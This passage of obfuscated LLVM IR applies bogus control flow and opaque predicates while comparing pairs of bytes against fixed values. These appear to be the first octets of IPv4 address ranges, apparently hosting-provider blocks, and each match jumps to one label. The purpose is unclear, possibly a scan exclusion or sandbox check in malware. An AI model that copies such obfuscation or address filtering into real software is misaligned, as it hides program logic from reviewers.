  %1746 = icmp eq i32 %1745, 159
  br i1 %1746, label %1747, label %1755

; <label>:1747:                                   ; preds = %1743
  %1748 = load i8, i8* %11, align 1
  %1749 = zext i8 %1748 to i32
  %1750 = icmp sge i32 %1749, 120
  br i1 %1750, label %1751, label %1755

; <label>:1751:                                   ; preds = %1747
  %1752 = load i8, i8* %11, align 1
  %1753 = zext i8 %1752 to i32
  %1754 = icmp slt i32 %1753, 121
  br i1 %1754, label %5259, label %1755

; <label>:1755:                                   ; preds = %1751, %1747, %1743
  %1756 = load i32, i32* @x.57
  %1757 = load i32, i32* @y.58
  %1758 = sub i32 %1756, 1
  %1759 = mul i32 %1756, %1758
  %1760 = urem i32 %1759, 2
  %1761 = icmp eq i32 %1760, 0
  %1762 = icmp slt i32 %1757, 10
  %1763 = or i1 %1761, %1762
  br i1 %1763, label %originalBB230, label %originalBB230alteredBB

originalBB230:                                    ; preds = %originalBB230alteredBB, %1755
  %1764 = load i8, i8* %10, align 1
  %1765 = zext i8 %1764 to i32
  %1766 = icmp eq i32 %1765, 160
  %1767 = load i32, i32* @x.57
  %1768 = load i32, i32* @y.58
  %1769 = sub i32 %1767, 1
  %1770 = mul i32 %1767, %1769
  %1771 = urem i32 %1770, 2
  %1772 = icmp eq i32 %1771, 0
  %1773 = icmp slt i32 %1768, 10
  %1774 = or i1 %1772, %1773
  br i1 %1774, label %originalBBpart2232, label %originalBB230alteredBB

originalBBpart2232:                               ; preds = %originalBB230
  br i1 %1766, label %1775, label %1783

; <label>:1775:                                   ; preds = %originalBBpart2232
  %1776 = load i8, i8* %11, align 1
  %1777 = zext i8 %1776 to i32
  %1778 = icmp sge i32 %1777, 132
  br i1 %1778, label %1779, label %1783

; <label>:1779:                                   ; preds = %1775
  %1780 = load i8, i8* %11, align 1
  %1781 = zext i8 %1780 to i32
  %1782 = icmp slt i32 %1781, 151
  br i1 %1782, label %5259, label %1783

; <label>:1783:                                   ; preds = %1779, %1775, %originalBBpart2232
  %1784 = load i32, i32* @x.57
  %1785 = load i32, i32* @y.58
  %1786 = sub i32 %1784, 1
  %1787 = mul i32 %1784, %1786
  %1788 = urem i32 %1787, 2
  %1789 = icmp eq i32 %1788, 0
  %1790 = icmp slt i32 %1785, 10
  %1791 = or i1 %1789, %1790
  br i1 %1791, label %originalBB234, label %originalBB234alteredBB

originalBB234:                                    ; preds = %originalBB234alteredBB, %1783
  %1792 = load i8, i8* %10, align 1
  %1793 = zext i8 %1792 to i32
  %1794 = icmp eq i32 %1793, 64
  %1795 = load i32, i32* @x.57
  %1796 = load i32, i32* @y.58
  %1797 = sub i32 %1795, 1
  %1798 = mul i32 %1795, %1797
  %1799 = urem i32 %1798, 2
  %1800 = icmp eq i32 %1799, 0
  %1801 = icmp slt i32 %1796, 10
  %1802 = or i1 %1800, %1801
  br i1 %1802, label %originalBBpart2236, label %originalBB234alteredBB

originalBBpart2236:                               ; preds = %originalBB234
  br i1 %1794, label %1803, label %1811

; <label>:1803:                                   ; preds = %originalBBpart2236
  %1804 = load i8, i8* %11, align 1
  %1805 = zext i8 %1804 to i32
  %1806 = icmp sge i32 %1805, 224
  br i1 %1806, label %1807, label %1811

; <label>:1807:                                   ; preds = %1803
  %1808 = load i8, i8* %11, align 1
  %1809 = zext i8 %1808 to i32
  %1810 = icmp slt i32 %1809, 227
  br i1 %1810, label %5259, label %1811

; <label>:1811:                                   ; preds = %1807, %1803, %originalBBpart2236
  %1812 = load i32, i32* @x.57
  %1813 = load i32, i32* @y.58
  %1814 = sub i32 %1812, 1
  %1815 = mul i32 %1812, %1814
  %1816 = urem i32 %1815, 2
  %1817 = icmp eq i32 %1816, 0
  %1818 = icmp slt i32 %1813, 10
  %1819 = or i1 %1817, %1818
  br i1 %1819, label %originalBB238, label %originalBB238alteredBB

originalBB238:                                    ; preds = %originalBB238alteredBB, %1811
  %1820 = load i8, i8* %10, align 1
  %1821 = zext i8 %1820 to i32
  %1822 = icmp eq i32 %1821, 162
  %1823 = load i32, i32* @x.57
  %1824 = load i32, i32* @y.58
  %1825 = sub i32 %1823, 1
  %1826 = mul i32 %1823, %1825
  %1827 = urem i32 %1826, 2
  %1828 = icmp eq i32 %1827, 0
  %1829 = icmp slt i32 %1824, 10
  %1830 = or i1 %1828, %1829
  br i1 %1830, label %originalBBpart2240, label %originalBB238alteredBB

originalBBpart2240:                               ; preds = %originalBB238
  br i1 %1822, label %1831, label %1855

; <label>:1831:                                   ; preds = %originalBBpart2240
  %1832 = load i32, i32* @x.57
  %1833 = load i32, i32* @y.58
  %1834 = sub i32 %1832, 1
  %1835 = mul i32 %1832, %1834
  %1836 = urem i32 %1835, 2
  %1837 = icmp eq i32 %1836, 0
  %1838 = icmp slt i32 %1833, 10
  %1839 = or i1 %1837, %1838
  br i1 %1839, label %originalBB242, label %originalBB242alteredBB

originalBB242:                                    ; preds = %originalBB242alteredBB, %1831
  %1840 = load i8, i8* %11, align 1
  %1841 = zext i8 %1840 to i32
  %1842 = icmp sge i32 %1841, 45
  %1843 = load i32, i32* @x.57
  %1844 = load i32, i32* @y.58
  %1845 = sub i32 %1843, 1
  %1846 = mul i32 %1843, %1845
  %1847 = urem i32 %1846, 2
  %1848 = icmp eq i32 %1847, 0
  %1849 = icmp slt i32 %1844, 10
  %1850 = or i1 %1848, %1849
  br i1 %1850, label %originalBBpart2244, label %originalBB242alteredBB

originalBBpart2244:                               ; preds = %originalBB242
  br i1 %1842, label %1851, label %1855

; <label>:1851:                                   ; preds = %originalBBpart2244
  %1852 = load i8, i8* %11, align 1
  %1853 = zext i8 %1852 to i32
  %1854 = icmp slt i32 %1853, 47
  br i1 %1854, label %5259, label %1855

; <label>:1855:                                   ; preds = %1851, %originalBBpart2244, %originalBBpart2240
  %1856 = load i32, i32* @x.57
  %1857 = load i32, i32* @y.58
  %1858 = sub i32 %1856, 1
  %1859 = mul i32 %1856, %1858
  %1860 = urem i32 %1859, 2
  %1861 = icmp eq i32 %1860, 0
  %1862 = icmp slt i32 %1857, 10
  %1863 = or i1 %1861, %1862
  br i1 %1863, label %originalBB246, label %originalBB246alteredBB

originalBB246:                                    ; preds = %originalBB246alteredBB, %1855
  %1864 = load i8, i8* %10, align 1
  %1865 = zext i8 %1864 to i32
  %1866 = icmp eq i32 %1865, 163
  %1867 = load i32, i32* @x.57
  %1868 = load i32, i32* @y.58
  %1869 = sub i32 %1867, 1
  %1870 = mul i32 %1867, %1869
  %1871 = urem i32 %1870, 2
  %1872 = icmp eq i32 %1871, 0
  %1873 = icmp slt i32 %1868, 10
  %1874 = or i1 %1872, %1873
  br i1 %1874, label %originalBBpart2248, label %originalBB246alteredBB

originalBBpart2248:                               ; preds = %originalBB246
  br i1 %1866, label %1875, label %1899

; <label>:1875:                                   ; preds = %originalBBpart2248
  %1876 = load i32, i32* @x.57
  %1877 = load i32, i32* @y.58
  %1878 = sub i32 %1876, 1
  %1879 = mul i32 %1876, %1878
  %1880 = urem i32 %1879, 2
  %1881 = icmp eq i32 %1880, 0
  %1882 = icmp slt i32 %1877, 10
  %1883 = or i1 %1881, %1882
  br i1 %1883, label %originalBB250, label %originalBB250alteredBB

originalBB250:                                    ; preds = %originalBB250alteredBB, %1875
  %1884 = load i8, i8* %11, align 1
  %1885 = zext i8 %1884 to i32
  %1886 = icmp sge i32 %1885, 205
  %1887 = load i32, i32* @x.57
  %1888 = load i32, i32* @y.58
  %1889 = sub i32 %1887, 1
  %1890 = mul i32 %1887, %1889
  %1891 = urem i32 %1890, 2
  %1892 = icmp eq i32 %1891, 0
  %1893 = icmp slt i32 %1888, 10
  %1894 = or i1 %1892, %1893
  br i1 %1894, label %originalBBpart2252, label %originalBB250alteredBB

originalBBpart2252:                               ; preds = %originalBB250
  br i1 %1886, label %1895, label %1899

; <label>:1895:                                   ; preds = %originalBBpart2252
  %1896 = load i8, i8* %11, align 1
  %1897 = zext i8 %1896 to i32
  %1898 = icmp slt i32 %1897, 207
  br i1 %1898, label %5259, label %1899

; <label>:1899:                                   ; preds = %1895, %originalBBpart2252, %originalBBpart2248
  %1900 = load i32, i32* @x.57
  %1901 = load i32, i32* @y.58
  %1902 = sub i32 %1900, 1
  %1903 = mul i32 %1900, %1902
  %1904 = urem i32 %1903, 2
  %1905 = icmp eq i32 %1904, 0
  %1906 = icmp slt i32 %1901, 10
  %1907 = or i1 %1905, %1906
  br i1 %1907, label %originalBB254, label %originalBB254alteredBB

originalBB254:                                    ; preds = %originalBB254alteredBB, %1899
  %1908 = load i8, i8* %10, align 1
  %1909 = zext i8 %1908 to i32
  %1910 = icmp eq i32 %1909, 164
  %1911 = load i32, i32* @x.57
  %1912 = load i32, i32* @y.58
  %1913 = sub i32 %1911, 1
  %1914 = mul i32 %1911, %1913
  %1915 = urem i32 %1914, 2
  %1916 = icmp eq i32 %1915, 0
  %1917 = icmp slt i32 %1912, 10
  %1918 = or i1 %1916, %1917
  br i1 %1918, label %originalBBpart2256, label %originalBB254alteredBB

originalBBpart2256:                               ; preds = %originalBB254
  br i1 %1910, label %1919, label %1927

; <label>:1919:                                   ; preds = %originalBBpart2256
  %1920 = load i8, i8* %11, align 1
  %1921 = zext i8 %1920 to i32
  %1922 = icmp sge i32 %1921, 45
  br i1 %1922, label %1923, label %1927

; <label>:1923:                                   ; preds = %1919
  %1924 = load i8, i8* %11, align 1
  %1925 = zext i8 %1924 to i32
  %1926 = icmp slt i32 %1925, 50
  br i1 %1926, label %5259, label %1927

; <label>:1927:                                   ; preds = %1923, %1919, %originalBBpart2256
  %1928 = load i8, i8* %10, align 1
  %1929 = zext i8 %1928 to i32
  %1930 = icmp eq i32 %1929, 164
  br i1 %1930, label %1931, label %1955

; <label>:1931:                                   ; preds = %1927
  %1932 = load i8, i8* %11, align 1
  %1933 = zext i8 %1932 to i32
  %1934 = icmp sge i32 %1933, 217
  br i1 %1934, label %1935, label %1955

; <label>:1935:                                   ; preds = %1931
  %1936 = load i32, i32* @x.57
  %1937 = load i32, i32* @y.58
  %1938 = sub i32 %1936, 1
  %1939 = mul i32 %1936, %1938
  %1940 = urem i32 %1939, 2
  %1941 = icmp eq i32 %1940, 0
  %1942 = icmp slt i32 %1937, 10
  %1943 = or i1 %1941, %1942
  br i1 %1943, label %originalBB258, label %originalBB258alteredBB

originalBB258:                                    ; preds = %originalBB258alteredBB, %1935
  %1944 = load i8, i8* %11, align 1
  %1945 = zext i8 %1944 to i32
  %1946 = icmp slt i32 %1945, 233
  %1947 = load i32, i32* @x.57
  %1948 = load i32, i32* @y.58
  %1949 = sub i32 %1947, 1
  %1950 = mul i32 %1947, %1949
  %1951 = urem i32 %1950, 2
  %1952 = icmp eq i32 %1951, 0
  %1953 = icmp slt i32 %1948, 10
  %1954 = or i1 %1952, %1953
  br i1 %1954, label %originalBBpart2260, label %originalBB258alteredBB

originalBBpart2260:                               ; preds = %originalBB258
  br i1 %1946, label %5259, label %1955

; <label>:1955:                                   ; preds = %originalBBpart2260, %1931, %1927
  %1956 = load i32, i32* @x.57
  %1957 = load i32, i32* @y.58
  %1958 = sub i32 %1956, 1
  %1959 = mul i32 %1956, %1958
  %1960 = urem i32 %1959, 2
  %1961 = icmp eq i32 %1960, 0
  %1962 = icmp slt i32 %1957, 10
  %1963 = or i1 %1961, %1962
  br i1 %1963, label %originalBB262, label %originalBB262alteredBB

originalBB262:                                    ; preds = %originalBB262alteredBB, %1955
  %1964 = load i8, i8* %10, align 1
  %1965 = zext i8 %1964 to i32
  %1966 = icmp eq i32 %1965, 169
  %1967 = load i32, i32* @x.57
  %1968 = load i32, i32* @y.58
  %1969 = sub i32 %1967, 1
  %1970 = mul i32 %1967, %1969
  %1971 = urem i32 %1970, 2
  %1972 = icmp eq i32 %1971, 0
  %1973 = icmp slt i32 %1968, 10
  %1974 = or i1 %1972, %1973
  br i1 %1974, label %originalBBpart2264, label %originalBB262alteredBB

originalBBpart2264:                               ; preds = %originalBB262
  br i1 %1966, label %1975, label %1983

; <label>:1975:                                   ; preds = %originalBBpart2264
  %1976 = load i8, i8* %11, align 1
  %1977 = zext i8 %1976 to i32
  %1978 = icmp sge i32 %1977, 252
  br i1 %1978, label %1979, label %1983

; <label>:1979:                                   ; preds = %1975
  %1980 = load i8, i8* %11, align 1
  %1981 = zext i8 %1980 to i32
  %1982 = icmp slt i32 %1981, 254
  br i1 %1982, label %5259, label %1983

; <label>:1983:                                   ; preds = %1979, %1975, %originalBBpart2264
  %1984 = load i8, i8* %10, align 1
  %1985 = zext i8 %1984 to i32
  %1986 = icmp eq i32 %1985, 199
  br i1 %1986, label %1987, label %2027

; <label>:1987:                                   ; preds = %1983
  %1988 = load i32, i32* @x.57
  %1989 = load i32, i32* @y.58
  %1990 = sub i32 %1988, 1
  %1991 = mul i32 %1988, %1990
  %1992 = urem i32 %1991, 2
  %1993 = icmp eq i32 %1992, 0
  %1994 = icmp slt i32 %1989, 10
  %1995 = or i1 %1993, %1994
  br i1 %1995, label %originalBB266, label %originalBB266alteredBB

originalBB266:                                    ; preds = %originalBB266alteredBB, %1987
  %1996 = load i8, i8* %11, align 1
  %1997 = zext i8 %1996 to i32
  %1998 = icmp sge i32 %1997, 121
  %1999 = load i32, i32* @x.57
  %2000 = load i32, i32* @y.58
  %2001 = sub i32 %1999, 1
  %2002 = mul i32 %1999, %2001
  %2003 = urem i32 %2002, 2
  %2004 = icmp eq i32 %2003, 0
  %2005 = icmp slt i32 %2000, 10
  %2006 = or i1 %2004, %2005
  br i1 %2006, label %originalBBpart2268, label %originalBB266alteredBB

originalBBpart2268:                               ; preds = %originalBB266
  br i1 %1998, label %2007, label %2027

; <label>:2007:                                   ; preds = %originalBBpart2268
  %2008 = load i32, i32* @x.57
  %2009 = load i32, i32* @y.58
  %2010 = sub i32 %2008, 1
  %2011 = mul i32 %2008, %2010
  %2012 = urem i32 %2011, 2
  %2013 = icmp eq i32 %2012, 0
  %2014 = icmp slt i32 %2009, 10
  %2015 = or i1 %2013, %2014
  br i1 %2015, label %originalBB270, label %originalBB270alteredBB

originalBB270:                                    ; preds = %originalBB270alteredBB, %2007
  %2016 = load i8, i8* %11, align 1
  %2017 = zext i8 %2016 to i32
  %2018 = icmp slt i32 %2017, 254
  %2019 = load i32, i32* @x.57
  %2020 = load i32, i32* @y.58
  %2021 = sub i32 %2019, 1
  %2022 = mul i32 %2019, %2021
  %2023 = urem i32 %2022, 2
  %2024 = icmp eq i32 %2023, 0
  %2025 = icmp slt i32 %2020, 10
  %2026 = or i1 %2024, %2025
  br i1 %2026, label %originalBBpart2272, label %originalBB270alteredBB

originalBBpart2272:                               ; preds = %originalBB270
  br i1 %2018, label %5259, label %2027

; <label>:2027:                                   ; preds = %originalBBpart2272, %originalBBpart2268, %1983
  %2028 = load i32, i32* @x.57
  %2029 = load i32, i32* @y.58
  %2030 = sub i32 %2028, 1
  %2031 = mul i32 %2028, %2030
  %2032 = urem i32 %2031, 2
  %2033 = icmp eq i32 %2032, 0
  %2034 = icmp slt i32 %2029, 10
  %2035 = or i1 %2033, %2034
  br i1 %2035, label %originalBB274, label %originalBB274alteredBB

originalBB274:                                    ; preds = %originalBB274alteredBB, %2027
  %2036 = load i8, i8* %10, align 1
  %2037 = zext i8 %2036 to i32
  %2038 = icmp eq i32 %2037, 205
  %2039 = load i32, i32* @x.57
  %2040 = load i32, i32* @y.58
  %2041 = sub i32 %2039, 1
  %2042 = mul i32 %2039, %2041
  %2043 = urem i32 %2042, 2
  %2044 = icmp eq i32 %2043, 0
  %2045 = icmp slt i32 %2040, 10
  %2046 = or i1 %2044, %2045
  br i1 %2046, label %originalBBpart2276, label %originalBB274alteredBB

originalBBpart2276:                               ; preds = %originalBB274
  br i1 %2038, label %2047, label %2071

; <label>:2047:                                   ; preds = %originalBBpart2276
  %2048 = load i32, i32* @x.57
  %2049 = load i32, i32* @y.58
  %2050 = sub i32 %2048, 1
  %2051 = mul i32 %2048, %2050
  %2052 = urem i32 %2051, 2
  %2053 = icmp eq i32 %2052, 0
  %2054 = icmp slt i32 %2049, 10
  %2055 = or i1 %2053, %2054
  br i1 %2055, label %originalBB278, label %originalBB278alteredBB

originalBB278:                                    ; preds = %originalBB278alteredBB, %2047
  %2056 = load i8, i8* %11, align 1
  %2057 = zext i8 %2056 to i32
  %2058 = icmp sge i32 %2057, 1
  %2059 = load i32, i32* @x.57
  %2060 = load i32, i32* @y.58
  %2061 = sub i32 %2059, 1
  %2062 = mul i32 %2059, %2061
  %2063 = urem i32 %2062, 2
  %2064 = icmp eq i32 %2063, 0
  %2065 = icmp slt i32 %2060, 10
  %2066 = or i1 %2064, %2065
  br i1 %2066, label %originalBBpart2280, label %originalBB278alteredBB

originalBBpart2280:                               ; preds = %originalBB278
  br i1 %2058, label %2067, label %2071

; <label>:2067:                                   ; preds = %originalBBpart2280
  %2068 = load i8, i8* %11, align 1
  %2069 = zext i8 %2068 to i32
  %2070 = icmp slt i32 %2069, 118
  br i1 %2070, label %5259, label %2071

; <label>:2071:                                   ; preds = %2067, %originalBBpart2280, %originalBBpart2276
  %2072 = load i32, i32* @x.57
  %2073 = load i32, i32* @y.58
  %2074 = sub i32 %2072, 1
  %2075 = mul i32 %2072, %2074
  %2076 = urem i32 %2075, 2
  %2077 = icmp eq i32 %2076, 0
  %2078 = icmp slt i32 %2073, 10
  %2079 = or i1 %2077, %2078
  br i1 %2079, label %originalBB282, label %originalBB282alteredBB

originalBB282:                                    ; preds = %originalBB282alteredBB, %2071
  %2080 = load i8, i8* %10, align 1
  %2081 = zext i8 %2080 to i32
  %2082 = icmp eq i32 %2081, 207
  %2083 = load i32, i32* @x.57
  %2084 = load i32, i32* @y.58
  %2085 = sub i32 %2083, 1
  %2086 = mul i32 %2083, %2085
  %2087 = urem i32 %2086, 2
  %2088 = icmp eq i32 %2087, 0
  %2089 = icmp slt i32 %2084, 10
  %2090 = or i1 %2088, %2089
  br i1 %2090, label %originalBBpart2284, label %originalBB282alteredBB

originalBBpart2284:                               ; preds = %originalBB282
  br i1 %2082, label %2091, label %2099

; <label>:2091:                                   ; preds = %originalBBpart2284
  %2092 = load i8, i8* %11, align 1
  %2093 = zext i8 %2092 to i32
  %2094 = icmp sge i32 %2093, 60
  br i1 %2094, label %2095, label %2099

; <label>:2095:                                   ; preds = %2091
  %2096 = load i8, i8* %11, align 1
  %2097 = zext i8 %2096 to i32
  %2098 = icmp slt i32 %2097, 62
  br i1 %2098, label %5259, label %2099

; <label>:2099:                                   ; preds = %2095, %2091, %originalBBpart2284
  %2100 = load i8, i8* %10, align 1
  %2101 = zext i8 %2100 to i32
  %2102 = icmp eq i32 %2101, 104
  br i1 %2102, label %2103, label %2127

; <label>:2103:                                   ; preds = %2099
  %2104 = load i32, i32* @x.57
  %2105 = load i32, i32* @y.58
  %2106 = sub i32 %2104, 1
  %2107 = mul i32 %2104, %2106
  %2108 = urem i32 %2107, 2
  %2109 = icmp eq i32 %2108, 0
  %2110 = icmp slt i32 %2105, 10
  %2111 = or i1 %2109, %2110
  br i1 %2111, label %originalBB286, label %originalBB286alteredBB

originalBB286:                                    ; preds = %originalBB286alteredBB, %2103
  %2112 = load i8, i8* %11, align 1
  %2113 = zext i8 %2112 to i32
  %2114 = icmp sge i32 %2113, 16
  %2115 = load i32, i32* @x.57
  %2116 = load i32, i32* @y.58
  %2117 = sub i32 %2115, 1
  %2118 = mul i32 %2115, %2117
  %2119 = urem i32 %2118, 2
  %2120 = icmp eq i32 %2119, 0
  %2121 = icmp slt i32 %2116, 10
  %2122 = or i1 %2120, %2121
  br i1 %2122, label %originalBBpart2288, label %originalBB286alteredBB

originalBBpart2288:                               ; preds = %originalBB286
  br i1 %2114, label %2123, label %2127

; <label>:2123:                                   ; preds = %originalBBpart2288
  %2124 = load i8, i8* %11, align 1
  %2125 = zext i8 %2124 to i32
  %2126 = icmp slt i32 %2125, 31
  br i1 %2126, label %5259, label %2127

; <label>:2127:                                   ; preds = %2123, %originalBBpart2288, %2099
  %2128 = load i8, i8* %10, align 1
  %2129 = zext i8 %2128 to i32
  %2130 = icmp eq i32 %2129, 188
  br i1 %2130, label %2131, label %2151

; <label>:2131:                                   ; preds = %2127
  %2132 = load i32, i32* @x.57
  %2133 = load i32, i32* @y.58
  %2134 = sub i32 %2132, 1
  %2135 = mul i32 %2132, %2134
  %2136 = urem i32 %2135, 2
  %2137 = icmp eq i32 %2136, 0
  %2138 = icmp slt i32 %2133, 10
  %2139 = or i1 %2137, %2138
  br i1 %2139, label %originalBB290, label %originalBB290alteredBB

originalBB290:                                    ; preds = %originalBB290alteredBB, %2131
  %2140 = load i8, i8* %11, align 1
  %2141 = zext i8 %2140 to i32
  %2142 = icmp eq i32 %2141, 166
  %2143 = load i32, i32* @x.57
  %2144 = load i32, i32* @y.58
  %2145 = sub i32 %2143, 1
  %2146 = mul i32 %2143, %2145
  %2147 = urem i32 %2146, 2
  %2148 = icmp eq i32 %2147, 0
  %2149 = icmp slt i32 %2144, 10
  %2150 = or i1 %2148, %2149
  br i1 %2150, label %originalBBpart2292, label %originalBB290alteredBB

originalBBpart2292:                               ; preds = %originalBB290
  br i1 %2142, label %5259, label %2151

; <label>:2151:                                   ; preds = %originalBBpart2292, %2127
  %2152 = load i8, i8* %10, align 1
  %2153 = zext i8 %2152 to i32
  %2154 = icmp eq i32 %2153, 188
  br i1 %2154, label %2155, label %2175

; <label>:2155:                                   ; preds = %2151
  %2156 = load i32, i32* @x.57
  %2157 = load i32, i32* @y.58
  %2158 = sub i32 %2156, 1
  %2159 = mul i32 %2156, %2158
  %2160 = urem i32 %2159, 2
  %2161 = icmp eq i32 %2160, 0
  %2162 = icmp slt i32 %2157, 10
  %2163 = or i1 %2161, %2162
  br i1 %2163, label %originalBB294, label %originalBB294alteredBB

originalBB294:                                    ; preds = %originalBB294alteredBB, %2155
  %2164 = load i8, i8* %11, align 1
  %2165 = zext i8 %2164 to i32
  %2166 = icmp eq i32 %2165, 226
  %2167 = load i32, i32* @x.57
  %2168 = load i32, i32* @y.58
  %2169 = sub i32 %2167, 1
  %2170 = mul i32 %2167, %2169
  %2171 = urem i32 %2170, 2
  %2172 = icmp eq i32 %2171, 0
  %2173 = icmp slt i32 %2168, 10
  %2174 = or i1 %2172, %2173
  br i1 %2174, label %originalBBpart2296, label %originalBB294alteredBB

originalBBpart2296:                               ; preds = %originalBB294
  br i1 %2166, label %5259, label %2175

; <label>:2175:                                   ; preds = %originalBBpart2296, %2151
  %2176 = load i8, i8* %10, align 1
  %2177 = zext i8 %2176 to i32
  %2178 = icmp eq i32 %2177, 159
  br i1 %2178, label %2179, label %2183

; <label>:2179:                                   ; preds = %2175
  %2180 = load i8, i8* %11, align 1
  %2181 = zext i8 %2180 to i32
  %2182 = icmp eq i32 %2181, 203
  br i1 %2182, label %5259, label %2183

; <label>:2183:                                   ; preds = %2179, %2175
  %2184 = load i8, i8* %10, align 1
  %2185 = zext i8 %2184 to i32
  %2186 = icmp eq i32 %2185, 162
  br i1 %2186, label %2187, label %2191

; <label>:2187:                                   ; preds = %2183
  %2188 = load i8, i8* %11, align 1
  %2189 = zext i8 %2188 to i32
  %2190 = icmp eq i32 %2189, 243
  br i1 %2190, label %5259, label %2191

; <label>:2191:                                   ; preds = %2187, %2183
  %2192 = load i32, i32* @x.57
  %2193 = load i32, i32* @y.58
  %2194 = sub i32 %2192, 1
  %2195 = mul i32 %2192, %2194
  %2196 = urem i32 %2195, 2
  %2197 = icmp eq i32 %2196, 0
  %2198 = icmp slt i32 %2193, 10
  %2199 = or i1 %2197, %2198
  br i1 %2199, label %originalBB298, label %originalBB298alteredBB

originalBB298:                                    ; preds = %originalBB298alteredBB, %2191
  %2200 = load i8, i8* %10, align 1
  %2201 = zext i8 %2200 to i32
  %2202 = icmp eq i32 %2201, 45
  %2203 = load i32, i32* @x.57
  %2204 = load i32, i32* @y.58
  %2205 = sub i32 %2203, 1
  %2206 = mul i32 %2203, %2205
  %2207 = urem i32 %2206, 2
  %2208 = icmp eq i32 %2207, 0
  %2209 = icmp slt i32 %2204, 10
  %2210 = or i1 %2208, %2209
  br i1 %2210, label %originalBBpart2300, label %originalBB298alteredBB

originalBBpart2300:                               ; preds = %originalBB298
  br i1 %2202, label %2211, label %2231

; <label>:2211:                                   ; preds = %originalBBpart2300
  %2212 = load i32, i32* @x.57
  %2213 = load i32, i32* @y.58
  %2214 = sub i32 %2212, 1
  %2215 = mul i32 %2212, %2214
  %2216 = urem i32 %2215, 2
  %2217 = icmp eq i32 %2216, 0
  %2218 = icmp slt i32 %2213, 10
  %2219 = or i1 %2217, %2218
  br i1 %2219, label %originalBB302, label %originalBB302alteredBB

originalBB302:                                    ; preds = %originalBB302alteredBB, %2211
  %2220 = load i8, i8* %11, align 1
  %2221 = zext i8 %2220 to i32
  %2222 = icmp eq i32 %2221, 55
  %2223 = load i32, i32* @x.57
  %2224 = load i32, i32* @y.58
  %2225 = sub i32 %2223, 1
  %2226 = mul i32 %2223, %2225
  %2227 = urem i32 %2226, 2
  %2228 = icmp eq i32 %2227, 0
  %2229 = icmp slt i32 %2224, 10
  %2230 = or i1 %2228, %2229
  br i1 %2230, label %originalBBpart2304, label %originalBB302alteredBB

originalBBpart2304:                               ; preds = %originalBB302
  br i1 %2222, label %5259, label %2231

; <label>:2231:                                   ; preds = %originalBBpart2304, %originalBBpart2300
  %2232 = load i8, i8* %10, align 1
  %2233 = zext i8 %2232 to i32
  %2234 = icmp eq i32 %2233, 178
  br i1 %2234, label %2235, label %2239

; <label>:2235:                                   ; preds = %2231
  %2236 = load i8, i8* %11, align 1
  %2237 = zext i8 %2236 to i32
  %2238 = icmp eq i32 %2237, 62
  br i1 %2238, label %5259, label %2239

; <label>:2239:                                   ; preds = %2235, %2231
  %2240 = load i8, i8* %10, align 1
  %2241 = zext i8 %2240 to i32
  %2242 = icmp eq i32 %2241, 104
  br i1 %2242, label %2243, label %2247

; <label>:2243:                                   ; preds = %2239
  %2244 = load i8, i8* %11, align 1
  %2245 = zext i8 %2244 to i32
  %2246 = icmp eq i32 %2245, 131
  br i1 %2246, label %5259, label %2247

; <label>:2247:                                   ; preds = %2243, %2239
  %2248 = load i8, i8* %10, align 1
  %2249 = zext i8 %2248 to i32
  %2250 = icmp eq i32 %2249, 104
  br i1 %2250, label %2251, label %2271

; <label>:2251:                                   ; preds = %2247
  %2252 = load i32, i32* @x.57
  %2253 = load i32, i32* @y.58
  %2254 = sub i32 %2252, 1
  %2255 = mul i32 %2252, %2254
  %2256 = urem i32 %2255, 2
  %2257 = icmp eq i32 %2256, 0
  %2258 = icmp slt i32 %2253, 10
  %2259 = or i1 %2257, %2258
  br i1 %2259, label %originalBB306, label %originalBB306alteredBB

originalBB306:                                    ; preds = %originalBB306alteredBB, %2251
  %2260 = load i8, i8* %11, align 1
  %2261 = zext i8 %2260 to i32
  %2262 = icmp eq i32 %2261, 236
  %2263 = load i32, i32* @x.57
  %2264 = load i32, i32* @y.58
  %2265 = sub i32 %2263, 1
  %2266 = mul i32 %2263, %2265
  %2267 = urem i32 %2266, 2
  %2268 = icmp eq i32 %2267, 0
  %2269 = icmp slt i32 %2264, 10
  %2270 = or i1 %2268, %2269
  br i1 %2270, label %originalBBpart2308, label %originalBB306alteredBB

originalBBpart2308:                               ; preds = %originalBB306
  br i1 %2262, label %5259, label %2271

; <label>:2271:                                   ; preds = %originalBBpart2308, %2247
  %2272 = load i8, i8* %10, align 1
  %2273 = zext i8 %2272 to i32
  %2274 = icmp eq i32 %2273, 107
  br i1 %2274, label %2275, label %2279

; <label>:2275:                                   ; preds = %2271
  %2276 = load i8, i8* %11, align 1
  %2277 = zext i8 %2276 to i32
  %2278 = icmp eq i32 %2277, 170
  br i1 %2278, label %5259, label %2279

; <label>:2279:                                   ; preds = %2275, %2271
  %2280 = load i32, i32* @x.57
  %2281 = load i32, i32* @y.58
  %2282 = sub i32 %2280, 1
  %2283 = mul i32 %2280, %2282
  %2284 = urem i32 %2283, 2
  %2285 = icmp eq i32 %2284, 0
  %2286 = icmp slt i32 %2281, 10
  %2287 = or i1 %2285, %2286
  br i1 %2287, label %originalBB310, label %originalBB310alteredBB

originalBB310:                                    ; preds = %originalBB310alteredBB, %2279
  %2288 = load i8, i8* %10, align 1
  %2289 = zext i8 %2288 to i32
  %2290 = icmp eq i32 %2289, 138
  %2291 = load i32, i32* @x.57
  %2292 = load i32, i32* @y.58
  %2293 = sub i32 %2291, 1
  %2294 = mul i32 %2291, %2293
  %2295 = urem i32 %2294, 2
  %2296 = icmp eq i32 %2295, 0
  %2297 = icmp slt i32 %2292, 10
  %2298 = or i1 %2296, %2297
  br i1 %2298, label %originalBBpart2312, label %originalBB310alteredBB

originalBBpart2312:                               ; preds = %originalBB310
  br i1 %2290, label %2299, label %2303

; <label>:2299:                                   ; preds = %originalBBpart2312
  %2300 = load i8, i8* %11, align 1
  %2301 = zext i8 %2300 to i32
  %2302 = icmp eq i32 %2301, 197
  br i1 %2302, label %5259, label %2303

; <label>:2303:                                   ; preds = %2299, %originalBBpart2312
  %2304 = load i32, i32* @x.57
  %2305 = load i32, i32* @y.58
  %2306 = sub i32 %2304, 1
  %2307 = mul i32 %2304, %2306
  %2308 = urem i32 %2307, 2
  %2309 = icmp eq i32 %2308, 0
  %2310 = icmp slt i32 %2305, 10
  %2311 = or i1 %2309, %2310
  br i1 %2311, label %originalBB314, label %originalBB314alteredBB

originalBB314:                                    ; preds = %originalBB314alteredBB, %2303
  %2312 = load i8, i8* %10, align 1
  %2313 = zext i8 %2312 to i32
  %2314 = icmp eq i32 %2313, 138
  %2315 = load i32, i32* @x.57
  %2316 = load i32, i32* @y.58
  %2317 = sub i32 %2315, 1
  %2318 = mul i32 %2315, %2317
  %2319 = urem i32 %2318, 2
